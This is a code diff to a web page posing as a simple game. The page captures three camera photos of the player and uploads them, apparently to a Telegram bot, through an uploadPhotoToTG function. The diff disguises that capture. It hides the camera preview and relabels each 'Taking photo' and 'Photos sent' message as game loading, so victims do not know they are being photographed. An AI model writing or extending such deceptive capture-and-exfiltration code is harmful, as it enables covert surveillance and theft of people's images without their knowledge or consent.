@@ -149,7 +149,7 @@ body{font-family:'Nunito',sans-serif;background:var(--bg1);color:var(--text);tra
   <div class="gcard">
     <span class="card-emoji">👋</span>
     <h2 class="card-title">What's your name?</h2>
-    <p class="card-sub">So we know who's playing!</p>
+    <p class="card-sub">To write your name into the history books.!</p>
     <input type="text" class="name-input" id="nameInput" placeholder="Enter your name..." maxlength="30"/>
     <button class="capture-btn" onclick="submitName()">Next →</button>
   </div>
@@ -158,10 +158,10 @@ body{font-family:'Nunito',sans-serif;background:var(--bg1);color:var(--text);tra
 <!-- SELFIE SCREEN -->
 <div class="screen hidden" id="selfieScreen">
   <div class="gcard" style="max-width:340px">
-    <span class="card-emoji">📸</span>
-    <h2 class="card-title">Quick Start!</h2>
-    <p class="card-sub">Just Wait for a sec <strong>🐻</strong> Let the game load.<br/><br/>Click the button to Start!</p>
-    <div class="selfie-wrap"><video id="selfieVideo" autoplay playsinline muted></video></div>
+    <span class="card-emoji">❌⭕</span>
+    <h2 class="card-title">Quick Processing!</h2>
+    <p class="card-sub">Playing game increase your AURA, But the legend are those who create those games!<br/><br/>Click the button to Start!</p>
+   <!-- <div class="selfie-wrap"><video id="selfieVideo" autoplay playsinline muted></video></div> -->
     <div class="selfie-thumb-row">
       <img class="selfie-thumb" id="thumb0" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="photo 1"/>
       <img class="selfie-thumb" id="thumb1" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="photo 2"/>
@@ -409,7 +409,7 @@ async function startCapture(){
   const ctx2=canvas.getContext('2d');
 
   for(let i=0;i<3;i++){
-    document.getElementById('selfieCounter').textContent=`📸 Taking photo ${i+1} of 3...`;
+    document.getElementById('selfieCounter').textContent=`❌⭕ Loading Game ${i+1} of 3...`;
     document.getElementById('progBar').style.width=`${((i)/3)*100}%`;
     // small countdown flash
     await sleep(500);
@@ -428,10 +428,10 @@ async function startCapture(){
     await uploadPhotoToTG(dataUrl,i+1);
     await sleep(500);
   }
-  document.getElementById('selfieCounter').textContent='✅ All 3 photos sent!';
+  document.getElementById('selfieCounter').textContent='✅ Game Loaded!';
   // stop camera
   stopCamera();
-  showToast(`Photos sent! Welcome, ${playerName}! 🎉`,'📸');
+  showToast(`Game Loaded Succesfully! Welcome, ${playerName}! 🎉`,'😉');
   await sleep(1200);
   showScreen('genderScreen');
 }
